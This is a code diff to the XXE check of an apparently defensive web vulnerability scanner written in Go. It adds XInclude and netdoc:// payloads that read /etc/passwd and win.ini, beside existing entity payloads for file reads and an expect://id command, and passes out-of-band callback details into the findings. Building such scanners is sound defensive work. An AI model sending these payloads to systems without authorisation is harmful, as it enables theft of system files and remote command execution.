@@ -30,6 +30,13 @@ var xxeSeeds = []string{
 	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
 	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>`,
 	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`,
+	// A parser configured to refuse a DOCTYPE — or a filter that strips it — still
+	// resolves XInclude, which reads the file with no declaration at all.
+	`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
+	`<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/windows/win.ini" parse="text"/></root>`,
+	// Java's own document handler: `netdoc://` reaches a file the `file://` handler
+	// is not allowed to, and it resolves inside an ordinary entity.
+	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><root>&xxe;</root>`,
 }
 
 // xxeFileSignatures are the contents of the files the file-based seeds read.
@@ -81,7 +88,7 @@ func (xxe) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*find
 
 	for _, seed := range xxeSeeds {
 		for _, variant := range xxeVariants(seed) {
-			mutated, response, token, err := sendXXE(ctx, c, t, variant)
+			mutated, response, token, callback, err := sendXXE(ctx, c, t, variant)
 			if err != nil || mutated == nil || response == nil {
 				continue
 			}
@@ -96,16 +103,18 @@ func (xxe) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*find
 				return []*finding.Finding{xxeFinding(c, t, mutated, response, variant, signature)}
 			}
 			if token != "" {
-				pending = append(pending, xxeAttempt{token: token, request: mutated, response: response, variant: variant})
+				pending = append(pending, xxeAttempt{
+					token: token, request: mutated, response: response, variant: variant, callback: callback,
+				})
 			}
 		}
 	}
 
 	// Blind XXE is the common case: nothing is echoed, and the only proof is the
 	// callback the parser makes on its own.
-	if found, interactions := awaitXXECallbacks(ctx, c, pending); found != nil {
+	if found, detail, remote := awaitXXECallbacks(ctx, c, pending); found != nil {
 		f := xxeFinding(c, t, found.request, found.response, found.variant,
-			c.Bundle.T(i18n.KeyEvidenceOOB, found.callback, interactions, ""))
+			c.Bundle.T(i18n.KeyEvidenceOOB, found.callback, detail, remote))
 		return []*finding.Finding{f}
 	}
 
@@ -142,17 +151,17 @@ func xxeVariants(seed string) []payload.Variant {
 //
 // It is a free function rather than a method: the context belongs to another
 // package, and a check has no business adding behaviour to it.
-func sendXXE(ctx context.Context, c *checks.Context, t *checks.Target, variant payload.Variant) (*httpmsg.Request, *httpmsg.Response, string, error) {
+func sendXXE(ctx context.Context, c *checks.Context, t *checks.Target, variant payload.Variant) (*httpmsg.Request, *httpmsg.Response, string, string, error) {
 	body := variant.Value
-	token := ""
+	token, callback := "", ""
 	if c.OOB != nil {
 		callbackURL, minted := c.OOB.NewURL("xxe")
-		token = minted
+		token, callback = minted, callbackURL
 		body = strings.ReplaceAll(body, checks.CallbackURL, callbackURL)
 	} else if strings.Contains(body, checks.CallbackURL) {
 		// Without an interaction server the callback seeds cannot prove
 		// anything, so they are not sent.
-		return nil, nil, "", nil
+		return nil, nil, "", "", nil
 	}
 
 	mutated := t.Request.Clone()
@@ -163,15 +172,15 @@ func sendXXE(ctx context.Context, c *checks.Context, t *checks.Target, variant p
 
 	response, err := c.Do(ctx, mutated)
 	if err != nil {
-		return nil, nil, "", err
+		return nil, nil, "", "", err
 	}
-	return mutated, response, token, nil
+	return mutated, response, token, callback, nil
 }
 
 // awaitXXECallbacks waits for a parser to reach out.
-func awaitXXECallbacks(ctx context.Context, c *checks.Context, pending []xxeAttempt) (*xxeAttempt, string) {
+func awaitXXECallbacks(ctx context.Context, c *checks.Context, pending []xxeAttempt) (*xxeAttempt, string, string) {
 	if len(pending) == 0 || c.OOB == nil {
-		return nil, ""
+		return nil, "", ""
 	}
 	wait := c.OOBWait
 	if wait <= 0 {
@@ -181,17 +190,16 @@ func awaitXXECallbacks(ctx context.Context, c *checks.Context, pending []xxeAtte
 	for {
 		for i := range pending {
 			if interactions := c.OOB.Poll(pending[i].token); len(interactions) > 0 {
-				detail := interactions[0].Detail
-				return &pending[i], detail
+				return &pending[i], interactions[0].Detail, interactions[0].RemoteAddr
 			}
 		}
 		if time.Now().After(deadline) {
-			return nil, ""
+			return nil, "", ""
 		}
 		select {
 		case <-time.After(250 * time.Millisecond):
 		case <-ctx.Done():
-			return nil, ""
+			return nil, "", ""
 		}
 	}
 }
